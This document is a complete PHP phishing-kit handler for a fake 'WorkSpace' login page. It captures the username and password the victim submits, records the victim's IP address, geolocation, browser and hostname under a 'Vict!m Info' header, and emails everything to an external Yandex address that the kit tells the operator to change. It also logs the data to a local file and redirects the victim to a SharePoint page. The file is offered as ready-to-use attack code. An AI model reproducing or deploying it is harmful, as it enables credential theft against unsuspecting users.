<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------WorkSpace Info-----------------------\n";
$message .= "Username            : ".$_POST['userid']."\n";
$message .= "Password            : ".$_POST['pass']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY fudpage(doit)com-------------\n";
//change ur email here
$send = "Alliswell112@yandex.ru";
$subject = "Result from WorkSpace";
$headers = "From: WorkSpace<supertool@mxtoolbox.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);


$file = fopen("error_log.txt", "a");
fwrite ($file, "$message\r\n");
fclose ($file);


foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

}

header("Location: https://eastcoastwings-my.sharepoint.com/personal/donotreply_eastcoastwings_com/_layouts/15/onedrive.aspx?id=%2Fpersonal%2Fdonotreply%5Feastcoastwings%5Fcom%2FDocuments%2Fnew%2Em4a&parent=%2Fpersonal%2Fdonotreply%5Feastcoastwings%5Fcom%2FDocuments&originalPath=aHR0cHM6Ly9lYXN0Y29hc3R3aW5ncy1teS5zaGFyZXBvaW50LmNvbS86dTovcC9kb25vdHJlcGx5L0VieGdRYVh1dWhOR3RTNFNNN2tibUFJQlpmcDcwTHFyMTRqSFROT3Itc1QtMXc_cnRpbWU9WEFuUGdOZGUxMGc");
  

?>
